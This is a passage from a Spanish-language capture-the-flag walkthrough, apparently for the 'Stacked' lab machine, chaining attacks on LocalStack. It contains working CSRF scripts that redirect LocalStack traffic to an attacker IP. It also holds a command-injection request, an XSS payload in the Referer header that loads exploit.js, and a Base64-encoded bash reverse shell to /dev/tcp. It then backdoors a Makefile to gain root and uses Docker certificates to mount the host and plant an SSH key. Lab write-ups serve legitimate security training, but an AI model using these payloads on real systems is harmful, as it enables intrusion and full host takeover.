csrf.js:\n\u0026lt;!doctype html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;LocalStack Exploit\u0026lt;/title\u0026gt; \u0026lt;meta charset=\"utf-8\"\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script src=\"csrf.js\"\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  fetch('http://127.0.0.1:4566') .then(res =\u0026gt; res.text()) .then(console.log)  Este es un modo sencillo de ver si recibimos la respuesta de LocalStack mediante CSRF. Iniciamos un servidor web con Python en el puerto 8000 y accedemos a la página web maliciosa en 172.16.33.1:8000 (simulando que la víctima accede a la página web maliciosa):\n$ python3 -m http.server 8000 Serving HTTP on :: port 8000 (http://[::]:8000/) ... ::ffff:172.16.33.1 - - [] \"GET / HTTP/1.1\" 200 - ::ffff:172.16.33.1 - - [] \"GET /csrf.js HTTP/1.1\" 200 - ::ffff:172.16.33.1 - - [] \"GET /csrf.js HTTP/1.1\" 200 - ::ffff:172.16.33.1 - - [] code 404, message File not found ::ffff:172.16.33.1 - - [] \"GET /favicon.ico HTTP/1.1\" 404 -  Ahora podemos configurar algunas variables: FORWARD_EDGE_INMEM con valor False y HOSTNAME que contenga nuestra dirección IP de atacante (172.16.33.1).\nfetch('http://127.0.0.1:4566') .then(res =\u0026gt; res.text()) .then(console.log) fetch('http://127.0.0.1:4566/?_config_', { body: JSON.stringify({ variable: 'FORWARD_EDGE_INMEM', value: false }), headers: { 'Content-Type': 'application/json' }, method: 'post' }) .then(res =\u0026gt; res.text()) .then(console.log) fetch('http://127.0.0.1:4566/?_config_', { body: JSON.stringify({ variable: 'HOSTNAME', value: '172.16.33.1' }), headers: { 'Content-Type': 'application/json' }, method: 'post', }) .then(res =\u0026gt; res.text()) .then(console.log)  Y ahora vemos que LocalStack responde:\nAdemás, las variables se muestran en el log:\nlocalstack_main | INFO:localstack.services.infra: Updating value of config variable \"HOSTNAME\": 172.16.33.1 localstack_main | INFO:localstack.services.infra: Updating value of config variable \"FORWARD_EDGE_INMEM\": False  Con esto, hemos configurado LocalStack para que todas las peticiones pasen por nuestra dirección IP de atacante. Podemos verificarlo con nc:\n$ nc -nlvp 4566 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4566 Ncat: Listening on 0.0.0.0:4566 Ncat: Connection from 172.16.33.1. Ncat: Connection from 172.16.33.1:56875. GET /shell/ HTTP/1.1 Remote-Addr: 172.17.0.1 Host: localhost:4566 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:97.0) Gecko/20100101 Firefox/97.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 If-Modified-Since: Thu, 28 May 2020 17:39:06 GMT Cache-Control: max-age=0 X-Forwarded-For: 172.17.0.1, localhost:4566 x-localstack-edge: https://localhost:4566 Authorization: AWS4-HMAC-SHA256 Credential=__internal_call__/20160623/us-east-1/dynamodb/aws4_request, SignedHeaders=content-type;host;x-amz-date;x-amz-target, Signature=1234  Y si vamos a http://localhost:4566/shell/ (página web legítima), no vemos nada:\n$ curl http://localhost:4566/shell/ {}  Ahora controlamos también las respuestas. Podemos escribir un servidor HTTP con Python y Flask:\n#!/usr/bin/env python3 from flask import Flask, request app = Flask(__name__) @app.route('/shell/') def shell(): print(request.headers) return 'Hacked!!' if __name__ == '__main__': app.run(host='172.16.33.1', port=4566)  $ python3 app.py * Serving Flask app 'app' (lazy loading) * Environment: production WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead. * Debug mode: off * Running on http://172.16.33.1:4566/ (Press CTRL+C to quit) Remote-Addr: 172.17.0.1 Host: localhost:4566 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:97.0) Gecko/20100101 Firefox/97.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 Cache-Control: max-age=0 X-Forwarded-For: 172.17.0.1, localhost:4566 X-Localstack-Edge: https://localhost:4566 Authorization: AWS4-HMAC-SHA256 Credential=__internal_call__/20160623/us-east-1/dynamodb/aws4_request, SignedHeaders=content-type;host;x-amz-date;x-amz-target, Signature=1234 172.16.33.1 - - [] \"GET /shell/ HTTP/1.1\" 200 -  Y con esto, ya tenemos control total sobre las peticiones y respuestas de LocalStack.\nComprometiendo LocalStack. RCE Existe también un vector de ataque que puede derivar en ejecución remota de comandos (RCE) en el contenedor al acceder a /lambda/\u0026lt;functionName\u0026gt;/code (el parámetro functionName es vulnerable a inyección e comandos) mediante una petición POST (también explicado en SonarSource).\nPara probarlo, reiniciaré el contenedor de Docker y lanzaré esta petición:\n$ curl '127.0.0.1:8080/lambda/;curl%20172.16.33.1/code' -d '{\"awsEnvironment\":\"\"}' -H 'Content-Type: application/json' \u0026lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"\u0026gt; \u0026lt;title\u0026gt;500 Internal Server Error\u0026lt;/title\u0026gt; \u0026lt;h1\u0026gt;Internal Server Error\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.\u0026lt;/p\u0026gt;  Y se recibe una petición de vuelta:\n$ nc -nlvp 80 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::80 Ncat: Listening on 0.0.0.0:80 Ncat: Connection from 172.16.33.1. Ncat: Connection from 172.16.33.1:50609. GET / HTTP/1.1 Host: 172.16.33.1 User-Agent: curl/7.67.0 Accept: */*  Por tanto, podríamos incluso conseguir una reverse shell en el contenedor.\nEncontrando un XSS Podemos asumir que la máquina tiene un entorno de LocalStack en ejecución, por lo que podemos reproducir el vector de ataque mostrado en el blog y usar XSS para explotar la inyección de comandos y ganar acceso al contenedor (el proxy MITM no es necesario).\nEn primer lugar, necesitamos encontrar una entrada de usuario. La única que hay es un formulario de contacto en http://portfolio.stacked.htb:\nSi tratamos de usar un payload de XSS sencillo, el servidor lo bloquea:\nPodemos utilizar Burp Suite (Repeater) para probar más payloads. Mantendré nc escuchando en el puerto 80 para ver si algún payload se ejecuta.\nDespués de muchas pruebas, vemos que la cabecera Referer es inyectable:\nY recibimos una petición en nc:\n$ nc -nlvp 80 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::80 Ncat: Listening on 0.0.0.0:80 Ncat: Connection from 10.10.11.112. Ncat: Connection from 10.10.11.112:35146. GET / HTTP/1.1 Host: 10.10.17.44 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://mail.stacked.htb/read-mail.php?id=2 Connection: keep-alive Upgrade-Insecure-Requests: 1  Aunque vemos otro subdominio llamado mail.stacked.htb, no podemos acceder a él. El servidor nos redirige:\n$ curl -I mail.stacked.htb HTTP/1.1 302 Found Date: Server: Apache/2.4.41 (Ubuntu) Location: http://stacked.htb/ Content-Type: text/html; charset=iso-8859-1  Además, mail es un subdominio bastante corriente y ffuf no lo encontró.\nIntrusión en el contenedor Entonces, explotaremos la vulnerabilidad de inyección de comandos en /lambda/\u0026lt;functionName\u0026gt;/code para conseguir una reverse shell en el contenedor. El payload de reverse shell es el siguiente codificado en Base64:\n$ echo -n 'bash -i \u0026 /dev/tcp/10.10.17.44/4444 0\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx  Ahora creamos este archivo de JavaScript (exploit.js) que realiza una petición POST como se mostró anteriormente en la explotación en local:\nconst cmd = 'echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash' fetch(`http://127.0.0.1:8080/lambda/;${encodeURIComponent(cmd)}/code`, { body: JSON.stringify({ awsEnvironment: '' }), headers: { 'Content-Type': 'application/json' }, method: 'post' })  Y entonces podemos iniciar un servidor HTTP con Python y enviar el formulario de contacto inyectando el payload de XSS en la cabecera Referer para cargar el archivo de JavaScript malicioso:\n$ curl portfolio.stacked.htb/process.php -H 'Referer: \u0026lt;script src=\"http://10.10.17.44/exploit.js\"\u0026gt;\u0026lt;/script\u0026gt;' -d 'tel=1\u0026fullname=\u0026email=\u0026subject=\u0026message=' {\"success\":\"Your form has been submitted. Thank you!\"}  El navegador de la víctima solicita el archivo:\n$ python3 -m http.server 80 Serving HTTP on :: port 80 (http://[::]:80/) ... ::ffff:10.10.11.112 - - [] \"GET /exploit.js HTTP/1.1\" 200 -  Y recibimos la reverse shell:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.112. Ncat: Connection from 10.10.11.112:32822. bash: cannot set terminal process group (20): Not a tty bash: no job control in this shell bash: /root/.bashrc: Permission denied bash-5.0$ python3 -c 'import pty; pty.spawn(\"/bin/bash\")' python3 -c 'import pty; pty.spawn(\"/bin/bash\")' bash: /root/.bashrc: Permission denied bash-5.0$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm bash-5.0$ export TERM=xterm bash-5.0$ export SHELL=bash bash-5.0$ stty rows 50 columns 158  Enumeración del sistema Lo primero que vemos es que no somos root:\nbash-5.0$ whoami localstack  Veamos si existe algún volumen de datos compartido con la máquina anfitrión (host):\nbash-5.0$ df -h Filesystem Size Used Available Use% Mounted on overlay 7.3G 6.5G 691.7M 91% / tmpfs 64.0M 0 64.0M 0% /dev tmpfs 1.9G 0 1.9G 0% /sys/fs/cgroup /dev/mapper/ubuntu--vg-ubuntu--lv 7.3G 6.5G 691.7M 91% /tmp/localstack df: /root/.docker: Permission denied /dev/mapper/ubuntu--vg-ubuntu--lv 7.3G 6.5G 691.7M 91% /etc/resolv.conf /dev/mapper/ubuntu--vg-ubuntu--lv 7.3G 6.5G 691.7M 91% /etc/hostname /dev/mapper/ubuntu--vg-ubuntu--lv 7.3G 6.5G 691.7M 91% /etc/hosts shm 64.0M 0 64.0M 0% /dev/shm /dev/mapper/ubuntu--vg-ubuntu--lv 7.3G 6.5G 691.7M 91% /home/localstack/user.txt tmpfs 1.9G 0 1.9G 0% /proc/acpi tmpfs 64.0M 0 64.0M 0% /proc/kcore tmpfs 64.0M 0 64.0M 0% /proc/keys tmpfs 64.0M 0 64.0M 0% /proc/timer_list tmpfs 64.0M 0 64.0M 0% /proc/sched_debug tmpfs 1.9G 0 1.9G 0% /proc/scsi tmpfs 1.9G 0 1.9G 0% /sys/firmware  Bueno, tenemos algunos montajes (/tmp/localstack en /root/.docker y /home/localstack/user.txt). En este punto podemos leer la flag user.txt:\nbash-5.0$ cat /home/localstack/user.txt c877918fc5f7cb38e0631f7849c20b1b  Si miramos de nuevo al archivo docker-compose.yml, vemos que /tmp/localstack se utiliza como montaje de volumen. Este directorio se usa para almacenar los certificados de cliente. Estos archivos serán útiles para conectarnos a Docker por el puerto 2376, por lo que tenemos que escalar a root en el contenedor.\nEscalada de privilegios en el contenedor Vamos a enumerar procesos en ejecución por parte de root:\nbash-5.0$ ps -a | grep root 1 root 0:00 {docker-entrypoi} /bin/bash /usr/local/bin/docker-entrypoint.sh 14 root 0:15 {supervisord} /usr/bin/python3.8 /usr/bin/supervisord -c /etc/supervisord.conf 17 root 0:05 tail -qF /tmp/localstack_infra.log /tmp/localstack_infra.err 21 root 0:00 make infra 24 root 1:19 python bin/localstack start --host 95 root 2:22 java -Djava.library.path=./DynamoDBLocal_lib -Xmx256m -jar DynamoDBLocal.jar -port 44759 -dbPath /var/localstack/data/dynamodb 107 root 0:00 node /opt/code/localstack/localstack/node_modules/kinesalite/cli.js --shardLimit 100 --port 44677 --createStreamMs 500 --deleteStreamMs 500 --updateStreamMs 500 --path /var/localstack/data/kinesis 159289 localsta 0:00 grep root  Existe un comando make infra, que ejeuta una lista de comandos en un cierto archivo llamado Makefile. Estos son todos los archivos llamados Makefile en el contenedor:\nbash-5.0$ find / -name Makefile 2\u0026gt;/dev/null /usr/local/lib/node_modules/npm/node_modules/columnify/Makefile /usr/local/lib/node_modules/npm/node_modules/json-stringify-safe/Makefile /usr/local/lib/node_modules/npm/node_modules/extsprintf/Makefile /usr/local/lib/node_modules/npm/node_modules/retry/Makefile /usr/local/lib/node_modules/npm/node_modules/delayed-stream/Makefile /usr/local/lib/node_modules/npm/node_modules/delegates/Makefile /usr/local/lib/node_modules/npm/node_modules/isarray/Makefile /usr/local/lib/node_modules/npm/Makefile /usr/share/groff/1.22.4/font/devlj4/generate/Makefile /usr/share/groff/1.22.4/font/devps/generate/Makefile /usr/share/groff/1.22.4/font/devdvi/generate/Makefile /usr/lib/python3.8/config-3.8-x86_64-linux-gnu/Makefile /opt/code/localstack/localstack/node_modules/leveldown/deps/leveldb/leveldb-1.20/Makefile /opt/code/localstack/localstack/dashboard/web/node_modules/debug/Makefile /opt/code/localstack/localstack/dashboard/web/node_modules/delayed-stream/Makefile /opt/code/localstack/localstack/dashboard/web/node_modules/superagent/Makefile /opt/code/localstack/localstack/dashboard/web/node_modules/isarray/Makefile /opt/code/localstack/Makefile  El último parece más interesante, y de hecho tenemos permisos para modificar dicho archivo:\nbash-5.0$ ls -l /opt/code/localstack/Makefile -rw-rw-r-- 1 localsta localsta 8455 Feb 1 2021 /opt/code/localstack/Makefile  Entonces, podemos escribir un comando que nos mande una reverse shell. Pero tenemos que averiguar cómo decirle a root que ejecute make infra, porque este tipo de comando se ejecuta normalmente solo una vez en el inicio.\nMirando en el proyecto de LocalStack en GitHub usando GitHub Codespaces, podemos buscar por restart:\nY vemos que hay un modo de matar el proceso incluso sin ser root. Ahora podemos buscar por kill y encontrar la manera de decirle a LocalStack que reinicie infra como root:\nSolamente hay que insertar una cabecera llamada x-localstack-kill. Por tanto, modificaremos el Makefile para añadir una reverse shell y reiniciaremos el servicio mientras escuchamos con nc.\nPrimero, cogemos el archivo:\nbash-5.0$ nc 10.10.17.44 4444 \u0026lt; /opt/code/localstack/Makefile  $ nc -nlvp 4444 \u0026gt; Makefile_orig Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.112. Ncat: Connection from 10.10.11.112:40781. $ cp Makefile_orig Makefile_pwn  Y ahora lo modificamos. Este es el archivo Makefile modificado (nombrado Makefile_pwn en local):\n# ... infra: ## Manually start the local infrastructure for testing echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash ($(VENV_RUN); exec bin/localstack start --host) # ...  Y finalmente, sobrescribimos el archivo existente:\nbash-5.0$ curl 10.10.17.44/Makefile_pwn -so /opt/code/localstack/Makefile  Ahora es el momento de reiniciar el servicio y ganar acceso como root:\nbash-5.0$ curl 127.0.0.1:4566 -H 'x-localstack-kill: asdf'  $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.112. Ncat: Connection from 10.10.11.112:56628. bash: cannot set terminal process group (159315): Not a tty bash: no job control in this shell bash-5.0# python3 -c 'import pty; pty.spawn(\"/bin/bash\")' python3 -c 'import pty; pty.spawn(\"/bin/bash\")' bash-5.0# ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm bash-5.0# export TERM=xterm bash-5.0# export SHELL=bash bash-5.0# stty rows 50 columns 158  Escalada de privilegios en la máquina Genial, somos root en el contenedor. Ahora podemos buscar los certificados requeridos para interactuar con Docker en el puerto 2376:\nbash-5.0# find / -name \\*.pem\\* 2\u0026gt;/dev/null | grep -v etc /tmp/localstack/server.test.pem.key /tmp/localstack/server.test.pem.crt /tmp/localstack/server.test.pem /tmp/tmpiwxfx4eh.pem /tmp/tmpiwxfx4eh.pem.crt /tmp/tmpiwxfx4eh.pem.key /usr/lib/python3.8/site-packages/pip/_vendor/certifi/cacert.pem /usr/lib/python3.8/site-packages/certifi/cacert.pem /opt/code/localstack/localstack/node_modules/kinesalite/ssl/server-key.pem /opt/code/localstack/localstack/node_modules/kinesalite/ssl/server-crt.pem /opt/code/localstack/localstack/node_modules/kinesalite/ssl/ca-key.pem /opt/code/localstack/localstack/node_modules/kinesalite/ssl/ca-crt.pem /opt/code/localstack/localstack/node_modules/kinesalite/ssl/server-csr.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/keycert.passwd.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/dh512.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/keycert2.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/keycert.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/badcert.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/https_svn_python_org_root.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/ssl_cert.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/nullbytecert.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/badkey.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/nokia.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/ssl_key.passwd.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/nullcert.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/sha256.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/ssl_key.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/websocket/cacert.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/pyftpdlib/test/keycert.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/pip/_vendor/certifi/cacert.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/certifi/cacert.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/Cryptodome/SelfTest/PublicKey/test_vectors/ECC/ecc_p256_x509.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/Cryptodome/SelfTest/PublicKey/test_vectors/ECC/ecc_p256_private_enc_aes128.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/Cryptodome/SelfTest/PublicKey/test_vectors/ECC/ecc_p256_private_p8.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/Cryptodome/SelfTest/PublicKey/test_vectors/ECC/ecc_p256_private.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/Cryptodome/SelfTest/PublicKey/test_vectors/ECC/ecc_p256_private_enc_des3.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/Cryptodome/SelfTest/PublicKey/test_vectors/ECC/ecc_p256_private_p8_clear.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/Cryptodome/SelfTest/PublicKey/test_vectors/ECC/ecc_p256_public.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/Cryptodome/SelfTest/PublicKey/test_vectors/ECC/ecc_p256_private_enc_aes192.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/Cryptodome/SelfTest/PublicKey/test_vectors/ECC/ecc_p256_private_enc_aes256_gcm.pem /opt/code/localstack/.venv/lib/python3.8/site-packages/botocore/cacert.pem /root/.local/share/virtualenv/wheel/3.8/image/1/CopyPipInstall/pip-20.3.1-py2.py3-none-any/pip/_vendor/certifi/cacert.pem /root/.docker/key.pem /root/.docker/ca-key.pem /root/.docker/ca.pem /root/.docker/cert.pem  Los certificados en /root/.docker son los correctos. Podemos echar un vistazo a la documentación de Docker para saber cómo interactuar con un Docker en remoto usando certificados. Podemos decirle que nos muestre su versión:\nbash-5.0# docker --tlsverify --tlscacert ca.pem --tlscert cert.pem --tlskey key.pem -H 172.17.0.1:2376 version Client: Version: 17.05.0-ce API version: 1.29 Go version: go1.7.5 Git commit: 89658be Built: Fri May 5 15:36:11 2017 OS/Arch: linux/amd64 Server: Version: 20.10.8 API version: 1.41 (minimum version 1.12) Go version: go1.16.6 Git commit: 75249d8 Built: Fri Jul 30 19:52:16 2021 OS/Arch: linux/amd64 Experimental: false  Perfecto, ha funcionado. Como resultado, podemos usar Docker como si estuvieramos en la máquina anfitrión (host).\nNótese que 172.17.0.1 es la dirección IP de la interfaz docker0 de la máquina.\nPor comodidad, podemos configurar un alias (mydocker) al comando largo de docker como se muestra:\nbash-5.0# alias mydocker='docker --tlsverify --tlscacert ca.pem --tlscert cert.pem --tlskey key.pem -H 172.17.0.1:2376'  Usando este alias, ahora podemos listar los contenedores en ejecución:\nbash-5.0# mydocker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 910b69680838 localstack/localstack-full:0.12.6 \"docker-entrypoint.sh\" 20 hours ago Up 20 hours 127.0.0.1:443-\u0026gt;443/tcp, 127.0.0.1:4566-\u0026gt;4566/tcp, 127.0.0.1:4571-\u0026gt;4571/tcp, 127.0.0.1:8080-\u0026gt;8080/tcp localstack_main  Muestra solo una instancia de LocalStack. Y tenemos estas imágenes disponibles:\nbash-5.0# mydocker images REPOSITORY TAG IMAGE ID CREATED SIZE localstack/localstack-full 0.12.6 7085b5de9f7c 7 months ago 888MB localstack/localstack-full \u0026lt;none\u0026gt; 0601ea177088 13 months ago 882MB lambci/lambda nodejs12.x 22a4ada8399c 13 months ago 390MB lambci/lambda nodejs10.x db93be728e7b 13 months ago 385MB lambci/lambda nodejs8.10 5754fee26e6e 13 months ago 813MB  La idea aquí es ejecutar otro contenedor y montar el sistema de archivos de la máquina en el contenedor, de manera que podamos escribir una clave pública de SSH en /root/.ssh/authorized_keys y conectarnos como root por SSH.\nPodemos crear un par de claves usando ssh-keygen:\n$ ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (~/.ssh/id_rsa): ./id_rsa Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in ./id_rsa Your public key has been saved in ./id_rsa.pub The key fingerprint is: SHA256:3Nb1eAyClnfVUIvPYp270LB/EspMAcanzxZzNG62UUQ The key's randomart image is: +---[RSA 3072]----+ | . .=E| | +o. +.+| | .++o+++ | | . o.o++X=.| | S oo.@.B+| | . * B..| | = + + | | + + o| | +.| +----[SHA256]-----+ $ cat id_rsa.pub ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAh+6EhWWDF/im0ZA/M4jy+bzJWUOtZGrYbWUSKZsCXV2+7Fac0kE7wRW+zzIedFSVdC+xPO8MiIxaTblHlDodkP173F9Rmo/9hx7FLBM78SCwFcAJyqq1BAzcrOrGTE3kIwOx0Wv3xrRcLBWvCZnOo3UCwr8ynxmU5L05+0rGQVz4vZcGrT/4hbzgXCJBIW2ku0kRH04+t1zPikrLWDm25XR3UYQELGxsRJx+QJB526jRguCiqdlpz27S3LosJ+VxNamsoltl5EnHPtAZVsGHFTq0oVY3FXimnAU5NfrD2zp5ozbTlVFLvMO+55df4+7mJaeCD1jGE1gxklr5Dnpwr82Ef/+aiWMltAZC3XS6GwQqpNVqKeFdW6nY0mgggMYvu7zNIX55NTCb40G6PtRVLLpd5c9OBi9DpfGHBrV51aHleSbk/N M5kfP6urPfICVXSvgCGNcGKQeRheDBsiNMaeQ4zHfQscZtJL7sJtonT6gqU2JVKhUkM2bPuPBHNN0=  Para ejecutar un contenedor de Docker, necesitamos especificar una imagen. Podemos utilizar cualquiera de las de lambci/lambda, pero entraremos como usuario no privilegiado, por lo que no podremos acceder a los archivos de root en la máquina. Si usamos la imagen de localstack/localstack:0.12.6 tendremos errores debido a volúmenes existentes.\nPor tanto, tenemos que encontrar una manera de crear una imagen de Docker personalizada. Como la máquina no tiene conexión a Internet, tenemos que utilizar una imagen existente como base. Existe una imagen especial en Docker que se llama scratch y que es solamente un contenedor vacío.\nPara crear una imagen desde scratch, tenemos que copiar algunos binarios. Y para que los binarios funcionen, necesitamos copiar algunas librerías compartidas (por ejemplo, Glibc).\nCopiaremos los binarios /bin/sh, /bin/cat y /bin/echo para poder tener una shell y realizar operaciones de lectura y escritura. Estos binarios utilizan la misma librería compartida:\nbash-5.0# ldd /bin/sh /lib/ld-musl-x86_64.so.1 (0x7f43b9444000) libc.musl-x86_64.so.1 =\u0026gt; /lib/ld-musl-x86_64.so.1 (0x7f43b9444000) bash-5.0# ldd /bin/cat /lib/ld-musl-x86_64.so.1 (0x7f55e6a2c000) libc.musl-x86_64.so.1 =\u0026gt; /lib/ld-musl-x86_64.so.1 (0x7f55e6a2c000) bash-5.0# ldd /bin/echo /lib/ld-musl-x86_64.so.1 (0x7f691e268000) libc.musl-x86_64.so.1 =\u0026gt; /lib/ld-musl-x86_64.so.1 (0x7f691e268000)  Por tanto, el Dockerfile necesario para crear la imagen es este:\nFROM scratch WORKDIR /bin COPY sh . COPY cat . COPY echo . WORKDIR /lib COPY ld-musl-x86_64.so.1 .  Copiaremos estos archivos en el directorio de trabajo actual y contruiremos la imagen desde aquí también. La imagen se llama pwn:\nbash-5.0# echo -e 'FROM scratch\\nWORKDIR /bin\\nCOPY sh .\\nCOPY cat .\\nCOPY echo .\\nWORKDIR /lib\\nCOPY ld-musl-x86_64.so.1 .' \u0026gt; Dockerfile bash-5.0# cp /bin/sh . bash-5.0# cp /bin/cat . bash-5.0# cp /bin/echo . bash-5.0# cp /lib/ld-musl-x86_64.so.1 . bash-5.0# mydocker build -t pwn . Sending build context to Docker daemon 3.882MB Step 1/7 : FROM scratch ---\u0026gt; Step 2/7 : WORKDIR /bin ---\u0026gt; Running in 59c11f6289e3 Removing intermediate container 59c11f6289e3 ---\u0026gt; 2d5ecb48eafb Step 3/7 : COPY sh . ---\u0026gt; 5d2277fa1fb4 Step 4/7 : COPY cat . ---\u0026gt; 52a4554cb022 Step 5/7 : COPY echo . ---\u0026gt; 11c3ea334ad7 Step 6/7 : WORKDIR /lib ---\u0026gt; Running in d7554e33572d Removing intermediate container d7554e33572d ---\u0026gt; d9142f99a2e0 Step 7/7 : COPY ld-musl-x86_64.so.1 . ---\u0026gt; 6f7cf378f889 Successfully built 6f7cf378f889 Successfully tagged pwn:latest  Podemos verificar que se ha creado bien:\nbash-5.0# mydocker images REPOSITORY TAG IMAGE ID CREATED SIZE pwn latest 6f7cf378f889 About a minute ago 2.28MB localstack/localstack-full 0.12.6 7085b5de9f7c 7 months ago 888MB localstack/localstack-full \u0026lt;none\u0026gt; 0601ea177088 13 months ago 882MB lambci/lambda nodejs12.x 22a4ada8399c 13 months ago 390MB lambci/lambda nodejs10.x db93be728e7b 13 months ago 385MB lambci/lambda nodejs8.10 5754fee26e6e 13 months ago 813MB  Y entonces podemos ejecutar el contenedor utilizando esta imagen y especificando que / en la máquina anfitrión se monte en /mnt en el contenedor:\nbash-5.0# mydocker run --rm -v /:/mnt -it pwn /bin/sh /lib # cat /mnt/etc/hostname stacked  Y como se puede ver, /mnt/etc/hostname muestra stacked, por lo que estamos leyendo archivos de la máquina anfitrión. Entonces, vamos a añadir la clabe pública de SSH en /mnt/root/.ssh/authorized_keys (que es /root/.ssh/authorized_keys en el sistema de archivos de la máquina anfitrión):\n/lib # echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAh+6EhWWDF/im0ZA/M4jy+bzJWUOtZGrYbWUSKZsCXV2+7Fac0kE7wRW+zzIedFSVdC+xPO8MiIxaTblHlDodkP173F9Rmo/9hx7FLBM78SCwFcAJyqq1BAzcrOrGTE3kIwOx0Wv3xrRcLBWvCZnOo3UCwr8ynxmU5L05+0rGQVz4vZcGrT/4hbzgXCJBIW2ku0kRH04+t1zPikrLWDm25XR3UYQELGxsRJx+QJB526jRguCiqdlpz27S3LosJ+VxNamsoltl5EnHPtAZVsGHFTq0oVY3FXimnAU5NfrD2zp5ozbTlVFLvMO+55df4+7mJaeCD1jGE1gxklr5Dnpwr82Ef/+aiWMltAZC3XS6GwQqpNVqKeFdW6nY0mgggMYvu7zNIX55NTCb40G6PtRVLLpd5c9OBi9DpfGHBrV51aHleSbk/NM5kfP6urPfICVXSvgCGNcGKQeRheDBsiNMaeQ4zHfQscZtJL7sJtonT6gqU2JVKhUkM2bPuPBHNN0=' \u0026gt; /mnt/root/.ssh/authorized_keys /lib # cat /mnt/root/.ssh/authorized_keys ssh-rsa 